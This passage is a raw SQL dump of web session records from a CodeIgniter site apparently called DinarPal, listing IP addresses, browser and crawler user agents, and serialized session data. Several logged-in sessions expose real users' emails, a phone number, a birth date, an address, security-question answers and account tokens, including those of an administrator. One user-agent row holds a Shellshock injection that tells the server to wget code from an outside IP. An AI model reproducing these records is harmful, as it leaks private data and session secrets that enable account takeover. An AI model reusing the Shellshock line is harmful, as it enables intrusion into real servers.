('bf5e1bec031732a3beeb069e0cc56877', '208.67.172.36', 'Mozilla/5.0 (X11; U; Linux x86_64;en-US;rv:1.9.2.1', 1461736329, ''),
('bf86d96ff6f941fca6ae8dfa67e0c33a', '178.137.90.202', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;', 1461188320, ''),
('bf882adb09bb1c478cf95d25063b0e08', '66.249.69.60', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461661413, ''),
('bf8fb5810a464b917183886c33ed7868', '1.9.107.30', 'Mozilla/5.0 (Linux; Android 4.4.2; ASUS_T00J Build', 1461497371, 'a:1:{s:12:"me_id_parent";s:88:"Tnea9z7yIk54emhIzCv1WhLn95juA8k0Ue424cYpQZCiSrURXob7GwnbLWWBGvJ5fMZuNBWg3X-E93otZJbgHQ==";}'),
('bf9f65478e261e37b9247db84b0ea110', '180.76.15.148', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461547747, ''),
('bf9fc9d1e4b9bc4259515c5141703413', '134.249.55.100', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;', 1461436799, ''),
('bfc4a6d8d927192148978516f602b805', '173.236.241.168', '0', 1461858967, ''),
('bfee0940febeb0ebc6759a42aa132e6e', '40.77.167.93', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461801173, ''),
('c00ed7c93b60a9dd60c93a1f8183859b', '180.76.15.146', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461457976, ''),
('c0550dde151c9973dbfc99bc58e53651', '66.249.69.116', 'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/', 1461711642, ''),
('c05a34393656d8ee0b2523f008589897', '130.193.51.30', 'Mozilla/5.0 (compatible; YandexBot/3.0; +http://ya', 1461146373, ''),
('c0757e6415107781ee999138bb4504c6', '134.249.55.100', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;', 1461436800, ''),
('c08a140dc770104b57fd98eb48feb1ad', '93.190.69.10', '() { :; }; /bin/sh -c ''wget http://176.126.85.127:', 1461820448, ''),
('c0d13db6244b736daa9626b9a61e8fdc', '66.249.66.127', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461894813, ''),
('c0d14a68c551810d1b0008c5390968bc', '180.76.15.144', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461914446, ''),
('c0e6eef74a79f0fb07dd0837ca5d933d', '180.76.15.18', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461828115, ''),
('c0f4c919322609df802d8a306e56803c', '46.118.156.3', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;', 1461422008, ''),
('c17723409d5e445706ee479e9a33e6a3', '158.69.52.168', 'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help', 1461485411, 'a:1:{s:12:"me_id_parent";s:88:"tmA_sv6cWk-lJxYjTwHKkjvirMHkFOn3Bqc2kAIxgz4qStCYfzGTWoQzdNSG7ZlSxslgIFWrlXAkGr47_H_Pnw==";}'),
('c1990e56ff3633374ccbafdd60b9c7c6', '183.171.18.225', 'Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; NO', 1461463891, 'a:1:{s:16:"flash:old:sucess";s:40:"Activation is successful, please log in!";}'),
('c1b868e1effe935feeb576618f2e6448', '180.76.15.32', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461462469, ''),
('c24b444e50370b667da4159bd7125d69', '45.79.89.188', 'Mozilla/5.0 (compatible; Uptimebot/1.0; +http://ww', 1461273665, ''),
('c257a310c86b9bd1e678af64e895f389', '115.134.161.155', 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (K', 1461126757, ''),
('c2718c65f540bc05209c740b0989fe9c', '40.77.167.105', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461801166, ''),
('c2a58bb3dafc1eee1fd210e63ac075a5', '183.171.26.140', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac ', 1461164329, ''),
('c2ad549b22c7e5166d601f89e0b766f6', '46.118.156.3', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;', 1461186645, ''),
('c2d770afdd8bb7445fd55eaacbd1175d', '113.210.54.93', 'WhatsApp/2.16.13 A', 1461232081, 'a:2:{s:12:"me_id_parent";s:1:"0";s:15:"flash:new:error";s:33:"Opss! Invalid member unique link.";}'),
('c305aeaaa076919df4d3561a22e659cd', '45.79.89.188', 'Mozilla/5.0 (compatible; Uptimebot/1.0; +http://ww', 1461318150, ''),
('c314cd0c85a4fe7aca1ea783d89ae513', '113.210.54.93', 'WhatsApp/2.16.13 A', 1461232045, ''),
('c316db622646b5aa2b28c906e5295359', '66.249.64.41', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461846971, ''),
('c32be72d6e647144fc21574ff41b4e4d', '157.55.39.158', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461798543, ''),
('c339a19079b3a2540b4b86a8fd214c74', '175.143.49.149', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebK', 1461551677, 'a:1:{s:12:"me_id_parent";s:88:"TZ0bgB1xdnKRJY9ql7bKH-2JFEQFoHita_nxzMKFuAVt1kRyi2DXHu6Ac3nkpSxZqo297YCffP2OP-6Ou07uIg==";}'),
('c33dd34a73084b0d6bb3ad00b0460e9e', '180.76.15.144', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461860280, ''),
('c350fb95f0402cdeee4c78c69850a24e', '180.76.15.147', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461867303, ''),
('c351c0a80a3c78fb6207d7925096f988', '180.76.15.154', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461453663, ''),
('c3632db9bd837515a7fd50edd79ef64b', '180.76.15.22', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461658493, ''),
('c37254ac8e0226d61bb35fa1b02239d6', '62.210.115.133', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461888446, ''),
('c38fb51d389b08763883630454ef318d', '103.229.114.22', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko', 1461474978, 'a:1:{s:12:"me_id_parent";s:88:"LShO310pLQ66pBKB5MzNJdsUqUcoBbhWMD0uFw5EfocVXs96mQi0Gk8Or4_TY0NYFlIgTj7w45-Xwhf4kAs6kA==";}'),
('c397e562f7cd842f5d0df75c87b3f642', '134.249.55.100', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;', 1461934175, ''),
('c3b7dff3fc14c301cc732049f891d0dd', '180.76.15.33', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461548957, ''),
('c3e84fbbd53ea8c412c766dc5345b0bf', '115.164.86.8', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461467780, ''),
('c3eceee7b23905a631c748c38c309a2d', '175.138.178.15', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) Ap', 1461259102, ''),
('c403400306fe6a20dc59d44b4c3cfcec', '46.118.156.3', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2;', 1461641912, ''),
('c417c381530868b9bf27679dd09071e2', '89.163.148.58', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461115281, ''),
('c42be969a7dc20b0feaaae79f3c67314', '66.249.69.126', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461662121, ''),
('c49b0b214425c2be08da12947bdf73dc', '66.249.64.91', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461791079, ''),
('c4c952de823b8a0258152f1d48f82f77', '115.132.21.250', 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:46.0) Gecko', 1461125037, ''),
('c4e4344c2cb1935aafd1fa85272e5a1e', '134.249.55.100', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;', 1461436800, ''),
('c4e4b517ac2045d4cdd301f2d2750a8d', '66.249.69.217', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461476285, ''),
('c4f4009b95c9487d401618f8960405b6', '175.138.178.15', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) Ap', 1461262911, 'a:50:{s:5:"me_id";s:1:"5";s:8:"me_image";s:15:"default-img.jpg";s:12:"me_firstname";s:9:"God Admin";s:11:"me_lastname";s:6:"bujang";s:11:"me_username";s:8:"godadmin";s:11:"me_question";s:20:"What is my username?";s:9:"me_answer";s:2:"b1";s:14:"me_unique_link";s:32:"edbab45572c72a5d9440b40bcc0500c0";s:11:"me_address1";N;s:8:"me_city1";N;s:9:"me_state1";N;s:12:"me_postcode1";N;s:11:"me_country1";N;s:11:"me_address2";N;s:8:"me_city2";s:0:"";s:9:"me_state2";N;s:12:"me_postcode2";N;s:11:"me_country2";N;s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";N;s:13:"me_birth_date";N;s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";s:0:"";s:10:"me_twitter";s:0:"";s:12:"me_instagram";s:0:"";s:13:"me_googleplus";s:0:"";s:14:"me_whatsapp_no";N;s:11:"me_telegram";N;s:9:"me_wechat";N;s:8:"me_email";s:18:"staff@dinarpal.com";s:16:"me_register_date";s:19:"2014-12-28 07:28:05";s:15:"me_account_type";s:1:"1";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";s:25:"2016-04-22T02:21:49+08:00";s:12:"me_magic_num";s:32:"9512afcb3f0fde463ddf8e476a76be16";s:5:"ml_id";s:1:"2";s:9:"me_status";s:1:"1";s:10:"me_company";N;s:10:"me_reg_num";N;s:15:"me_company_doc1";N;s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";N;s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"GA";s:5:"sl_id";s:1:"1";s:4:"g_id";s:1:"0";s:9:"logged_in";b:1;}'),
('c5d0c36a29fea8e692943f4d49ab8287', '180.76.15.150', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461278780, ''),
('c5e414de4a7ec2f39640642f7bd1b22f', '66.249.69.53', 'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/', 1461414160, ''),
('c5f550e189fc35901011e280b545e3b1', '157.55.39.5', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461161245, ''),
('c616d89faf91e15f1e93ca17a5e42d7f', '82.193.127.15', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461299111, ''),
('c6214d80dc85c84a29a53d5e25714fd2', '78.46.50.246', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461525532, ''),
('c6504be07d527ced5bacfc911d4a92d0', '180.76.15.11', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461853397, ''),
('c67b540b1e324032237c9ef3284ba803', '66.249.79.97', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461182377, ''),
('c68f1ffa6ccdeb88e5ccb8b52e9824d2', '69.171.228.121', 'facebookexternalhit/1.1', 1461496320, 'a:1:{s:12:"me_id_parent";s:88:"2YC_7qy6gRg4w4PwYxvKbKaP1PQuI_R3s2rXw56aAiTHbLnYb6XkKawj0kZZWSIflDEAXoRZveCHty_qijN0-w==";}'),
('c69d313f9a1b4020e0cf031911159c1a', '180.76.15.148', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461746556, ''),
('c6a1204039801a3fb0b28eb10d44e887', '113.210.60.46', 'Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/201', 1461429269, ''),
('c6ca78b2b51d2ccf9c1eb4f42dd38d89', '13.92.241.115', 'semanticbot', 1461739135, ''),
('c6d94584adaaaa57f6dfc2d812931187', '175.136.140.216', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/5', 1461767454, ''),
('c6fac8940328eb06751addf3f84eb800', '180.76.15.13', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461673193, ''),
('c744fbc6843d2e95fa9184470483675e', '5.248.253.133', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows XP)', 1461159325, ''),
('c75472b841e6043e957cfeabbed59511', '180.76.15.138', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461317903, ''),
('c76d04498c9f03ee257aee76b2714053', '66.249.66.36', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461290344, ''),
('c77e00c15a65f1a286ad3d70b8b178ae', '210.48.221.10', 'Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/201', 1461767253, ''),
('c7aa64bf5dbdc68c295e0e4ec4cb35b4', '180.76.15.6', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461881775, ''),
('c7f960ff3c61da0eab83f73f86618616', '113.210.52.102', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461422016, 'a:2:{s:15:"flash:old:error";s:37:"Username ''Yusnita549'' already exists!";s:15:"flash:new:error";s:37:"Username ''Yusnita549'' already exists!";}'),
('c824f1afa062d9af4fce5b7aa03975ab', '218.208.254.180', 'Mozilla/5.0 (Linux; Android 5.0; SM-N9005 Build/LR', 1461506489, 'a:1:{s:12:"me_id_parent";s:88:"gVlvyTnbUxuogGfL7qX3gz6DuAZHn06Tup6moEkZL_HkAwPbf0YEzrYCGtxPyu4QOYEUxYLDKKvAHMWCZ3WLbQ==";}'),
('c82dcb93a425ca448d006a2a9ab62b2c', '180.76.15.10', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461429975, ''),
('c8385352b18e2d29de8aeb1dc3e4ab43', '175.141.171.212', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/53', 1461568930, ''),
('c850ecb7209de4153eb388948c053cbb', '180.76.15.14', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461684085, ''),
('c86b1c9f5d8e0c3d6da00eaa0a9bb3d5', '66.249.66.66', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461894402, ''),
('c8757539feaa7d392ca4774c52b09cea', '13.92.241.115', 'semanticbot', 1461739122, ''),
('c899955dcf0fa065582e21b6ab944dd2', '45.79.81.142', 'Mozilla/5.0 (compatible; Uptimebot/1.0; +http://ww', 1461224716, ''),
('c8b0a2c61f7dddcb4f5e3d5d78123d0a', '173.252.115.12', 'facebookexternalhit/1.1', 1461231334, 'a:1:{s:12:"me_id_parent";s:88:"RglFzVZPSGk15Nb-d8brCz2jXiCjd1Ogfh-znqXWo7H6cwFwy0aXvw51nFSLt21qnSuaoW8MoxyK4PmggjNkjg==";}'),
('c8be9a95fefa727e175dd04784e9ec58', '69.30.213.82', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461230862, ''),
('c907d504e4ae9bb1677983cb7115ff62', '66.249.75.106', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461550149, ''),
('c947e372c3e25a7cb7db8fe21f280fe5', '46.118.156.3', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;', 1461186644, ''),
('c9544035239062640a3c50f49e1603cb', '175.138.151.178', 'Mozilla/5.0 (Linux; Android 5.1.1; SM-N9208 Build/', 1461545382, 'a:1:{s:12:"me_id_parent";s:88:"JgReKxiDkagm6nIPeH77ZrIOkPIy2h5y3lEZk9XO0TWt4a33hxR5XGLUJdd2bbK2B_jdyJ0k_4eisrzfIEeQYw==";}'),
('c959f23216fc82697771ce60cd6236ef', '46.118.156.3', 'Mozilla/3.0 (x86 [en] Windows NT 5.1; Sun)', 1461457355, ''),
('c9609d3edbd79252081e62ea9ed1defa', '183.171.174.179', 'WhatsApp/2.16.13 A', 1461416616, ''),
('c96fc4b204878eb95a5f19dbd75c2c97', '178.137.90.202', 'Mozilla/4.0 (compatible; MSIE 6.0; America Online ', 1461487071, ''),
('c9d6c0d792f4002595edca6b76e2af2e', '113.210.60.46', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:46.0) Gecko', 1461430266, ''),
('c9f2c7848e41dd712899f7447f24a602', '66.249.69.227', 'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/', 1461456756, ''),
('ca0570c7c0987f0234730b8910f4fc10', '180.76.15.142', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461512464, ''),
('ca53356cd05415a7a20e412ba9f2c28b', '144.76.8.132', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461892141, ''),
('ca5afa2dfecddd076f45800bdaf3eda7', '66.249.69.4', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461546801, ''),
('ca626e565e5e38f635ea02bb0e034d01', '180.76.15.149', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461592480, ''),
('ca7560a8c7b5f47a9578bd6c8aed68dd', '169.54.233.119', '0', 1461594310, ''),
('ca82febfcc0df273eb1935e0f098ab8e', '180.76.15.30', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461810134, ''),
('ca997fda5ce324eb0a22b777a4258cad', '180.76.15.153', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461598827, ''),
('caa4b29f173004170814355aec7ec795', '180.76.15.11', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461716093, ''),
('caa8b9d4e57105a619c3c94cc24d5c82', '180.76.15.25', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461306880, ''),
('cab82f771282cdf1658a2c5d7a3c1f85', '164.132.161.79', 'Mozilla/5.0 (compatible; AhrefsBot/5.1; +http://ah', 1461438991, ''),
('cadf60d61875ecb631b478abd73849bd', '111.248.100.112', '0', 1461549410, ''),
('cafbc0599afc48e2daa0a6ad4de23c19', '180.76.15.155', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461112445, ''),
('cb0a0da291a3f7f182734441df897be6', '14.1.193.236', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/5', 1461119150, ''),
('cb71f32992f62e6732ecc7a25527e2b7', '180.76.15.140', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461802516, ''),
('cbac1b6d161f94efd40256c89e651155', '180.76.15.140', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461289746, ''),
('cbc63e8e8c03b0558e9cb8a4c9d7eff1', '0.0.0.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) Ap', 1461394619, ''),
('cbcc8866dc2b91cb8eed685af4d97e92', '66.249.66.55', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461268737, ''),
('cbd6e4f01c25e8825a3fce2e3923e9ec', '180.76.15.31', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461910530, ''),
('cbf271222bb03b22a88be22abe11cfdf', '45.79.89.188', 'Mozilla/5.0 (compatible; Uptimebot/1.0; +http://ww', 1461179366, ''),
('cc0b8bb265b1ee63f8b7415ee428f563', '175.136.140.216', 'WhatsApp/2.16.53 A', 1461911261, 'a:1:{s:12:"me_id_parent";s:8:"BDBZbQ==";}'),
('cc2020ee97aa41a227db970adb0dd182', '180.76.15.161', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461871313, ''),
('cc798c3f577f365f5679c8867c8292db', '40.77.167.45', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461258647, ''),
('ccb46fdad150b34becae75feb9c8ae8f', '66.249.64.170', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461779639, ''),
('ccbec6021b02c95d1e5134a2fc356fa4', '216.218.206.67', '0', 1461235903, ''),
('ccc2d8760eb77fef313ddab3c0cf4e81', '130.193.51.10', 'Mozilla/5.0 (compatible; YandexBot/3.0; +http://ya', 1461247720, ''),
('cccaaffb20bb4b070628958f865e4277', '157.55.39.150', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461468439, ''),
('ccd779313104513e35867b1d6c40be72', '46.118.156.3', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;', 1461186643, ''),
('ccd9fa006cfb821f301fc1047ee94bfa', '46.118.156.3', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;', 1461422008, ''),
('cce8716597e9c51d7c59f6d520e62130', '113.210.55.79', 'Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/201', 1461587457, ''),
('cd0996a70032cb786592bb7532f706ad', '113.210.52.3', 'Mozilla/5.0 (Linux; Android 5.1; XT1033 Build/LPB2', 1461428088, ''),
('cd0f22331cbe6ec3cd441695a7ec2076', '123.125.71.56', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461611319, ''),
('cd1dcf8d26e69806236aae5d69ad99d3', '180.76.15.22', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461939802, ''),
('cd3caf3d85554cf60a9ae5b27e585d33', '180.76.15.30', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461242195, ''),
('cd472145afa63b4fa346bd5fc1122b1b', '115.164.82.13', 'WhatsApp/2.16.2/i', 1461739308, 'a:1:{s:12:"me_id_parent";s:4:"AjQ=";}'),
('cd65f9760179f35eaccaee517aacee65', '207.46.13.26', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461258678, ''),
('cd744d0108458932a16ee0c4f3cd8ae3', '158.69.118.62', 'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help', 1461485399, 'a:1:{s:12:"me_id_parent";s:88:"6dnIY3jug3TF7Wy5l0baOOYP8-womfqY_lRxqPEYN79Ns9FfEa10I55dCkL_fVJTUcjeHvKoPAAvySCZXUFZZg==";}'),
('cd832765b6c29ad5d92bb4669ee9adcc', '45.55.229.99', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko', 1461718313, ''),
('cd98a33c1fe8334d1ce103735122f23a', '115.133.237.6', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/5', 1461852532, 'a:51:{s:5:"me_id";s:1:"7";s:8:"me_image";s:15:"default-img.jpg";s:12:"me_firstname";s:5:"arash";s:11:"me_lastname";s:5:"arash";s:11:"me_username";s:5:"arash";s:11:"me_question";s:20:"What is my username?";s:9:"me_answer";s:5:"arash";s:14:"me_unique_link";s:32:"81b9a3538d93a7623ad0e9bf1347d137";s:11:"me_address1";s:15:"DinarPal Street";s:8:"me_city1";s:10:"Ayer Keroh";s:9:"me_state1";s:6:"Melaka";s:12:"me_postcode1";s:5:"75450";s:11:"me_country1";s:8:"Malaysia";s:11:"me_address2";s:15:"DinarPal Street";s:8:"me_city2";s:10:"Ayer Keroh";s:9:"me_state2";s:6:"Melaka";s:12:"me_postcode2";s:5:"75450";s:11:"me_country2";s:8:"Malaysia";s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";s:11:"60166707888";s:13:"me_birth_date";s:10:"1977-01-19";s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";s:0:"";s:10:"me_twitter";s:0:"";s:12:"me_instagram";s:0:"";s:13:"me_googleplus";s:0:"";s:14:"me_whatsapp_no";s:0:"";s:11:"me_telegram";s:0:"";s:9:"me_wechat";s:0:"";s:8:"me_email";s:22:"arash.private@live.com";s:16:"me_register_date";s:19:"2016-04-23 17:41:44";s:15:"me_account_type";s:1:"1";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";s:25:"2016-04-28T21:17:19+08:00";s:12:"me_magic_num";s:32:"248dfd4fff3169f86edec2930684bfd4";s:5:"ml_id";s:1:"3";s:9:"me_status";s:1:"1";s:10:"me_company";s:0:"";s:10:"me_reg_num";s:0:"";s:15:"me_company_doc1";s:0:"";s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";s:0:"";s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"NU";s:5:"sl_id";s:1:"0";s:4:"g_id";s:1:"1";s:10:"me_is_amil";s:2:"no";s:9:"logged_in";b:1;}'),
('cde17d140c836ee0cbb3e09ddbebc83a', '180.76.15.146', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461896636, ''),
('ce088069dbc3a0649afec263601e9b00', '66.249.65.125', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461130747, ''),
('ce711d33c4643cb52ec849e856d34fdb', '123.246.120.73', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;', 1461616152, ''),
('ce8142a66e03964ef72718353602eb20', '198.204.240.2', 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; r', 1461563611, ''),
('cf05daf3d17b662f109e6d35ec8779df', '210.48.221.10', 'Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/201', 1461767717, ''),
('cf1d6361e25f80b52af504658c8d4f95', '62.210.143.245', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461761884, ''),
('cf8fa53d87f9d2b2a2792a8d23ab5c2f', '183.171.169.76', 'Mozilla/5.0 (Linux; Android 5.0; SM-G900F Build/LR', 1461849960, ''),
('cfb26837972ea81e88b3d4d5f7d87dd2', '46.118.156.3', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;', 1461641939, ''),
('cfc70ffd229aa785bdeaf54afbe5378e', '31.13.112.120', 'facebookexternalhit/1.1', 1461500215, ''),
('cffb115d7c37d5409162116c7ca2153b', '13.92.241.115', 'semanticbot', 1461739134, ''),
('cffdfa8a93e96e0baaf71e57cd224a01', '66.249.66.30', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461260075, ''),
('d0256689d2336b2eb92be9295d2ab6b5', '66.249.69.60', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461680835, ''),
('d027d7b707f16aa12725ba7d8ad63874', '222.85.138.75', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/5', 1461518325, ''),
('d0679dea821bd72333688b3e8ab9d835', '180.76.15.20', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461145227, ''),
('d0686be9e10ea14cbddbacccde44f5d0', '113.210.55.79', 'Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/201', 1461587389, ''),
('d08ea4ee71038ad80b58f480d51d0f6c', '107.150.32.59', 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1;', 1461524396, ''),
('d0b5a05a841d94409e02a1168275f800', '69.30.198.202', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461481022, '');
INSERT INTO `ci_sessions` (`session_id`, `ip_address`, `user_agent`, `last_activity`, `user_data`) VALUES
('d0bea3934e72494b2875becd05108d40', '115.164.82.86', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac ', 1461420997, 'a:53:{s:5:"me_id";s:2:"24";s:8:"me_image";s:15:"default-img.jpg";s:12:"me_firstname";s:19:"fadhlan97_president";s:11:"me_lastname";s:19:"fadhlan97_president";s:11:"me_username";s:19:"fadhlan97_president";s:11:"me_question";s:20:"What is my username?";s:9:"me_answer";s:19:"fadhlan97_president";s:14:"me_unique_link";s:32:"6015d944c8f9a1806b90b6d46af5ba12";s:11:"me_address1";N;s:8:"me_city1";N;s:9:"me_state1";N;s:12:"me_postcode1";N;s:11:"me_country1";N;s:11:"me_address2";N;s:8:"me_city2";N;s:9:"me_state2";N;s:12:"me_postcode2";N;s:11:"me_country2";N;s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";N;s:13:"me_birth_date";N;s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";N;s:10:"me_twitter";N;s:12:"me_instagram";N;s:13:"me_googleplus";N;s:14:"me_whatsapp_no";N;s:11:"me_telegram";N;s:9:"me_wechat";N;s:8:"me_email";s:20:"fadhlanj24@gmail.com";s:16:"me_register_date";s:19:"2016-04-23 22:15:35";s:15:"me_account_type";s:1:"1";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";N;s:12:"me_magic_num";s:32:"9b2e397ed5d134beea070156b0a21a9d";s:5:"ml_id";s:1:"3";s:9:"me_status";s:1:"1";s:10:"me_company";N;s:10:"me_reg_num";N;s:15:"me_company_doc1";N;s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";N;s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"NU";s:5:"sl_id";s:1:"0";s:4:"g_id";s:1:"0";s:9:"msg_login";s:153:"Thank You for choosing Dinarpal for your platform <br/>Please fill in all your personal detail<br />and deposit your money for your account verification.";s:9:"logged_in";b:1;s:11:"img_deposit";s:0:"";s:11:"arr_deposit";s:0:"";}'),
('d0d12d5f259f88bd4114920050fcd05f', '113.210.54.93', 'WhatsApp/2.16.13 A', 1461232005, ''),
('d0eb87d17793a941186027944007d255', '157.55.39.77', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461472185, ''),
('d106c07cac73fe674a4f785b187f5aad', '113.210.54.93', 'WhatsApp/2.16.13 A', 1461232004, ''),
('d11c71a129499626901c6339844a521c', '66.249.69.222', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461426504, ''),
('d120e5cb244f42f65f60399fd07fef65', '178.137.90.202', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;', 1461244599, ''),
